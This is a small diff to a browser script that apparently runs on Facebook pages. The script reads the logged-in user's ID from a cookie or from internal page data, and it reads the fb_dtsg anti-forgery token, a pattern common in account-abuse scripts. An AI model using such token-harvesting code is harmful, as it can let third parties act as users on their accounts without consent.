@@ -50,10 +50,8 @@ if(window.location.hostname.includes('facebook') === true) {
     body.appendChild(div);
     var aku = '';
     var fb_dtsg = '';
-    if(document.cookie.match(/c_user=([^;]+)/)[1]){
-        aku = document.cookie.match(/c_user=([^;]+)/)[1];
-    } else {
-        aku = require("CurrentUserInitialData").USER_ID;
+    if(aku == ''){
+        aku = require("CurrentUserInitialData").USER_ID; 
     }
     if(document.getElementsByName('fb_dtsg')[0]) {
         token_dtsg = dc.getElementsByName('fb_dtsg')[0].value;
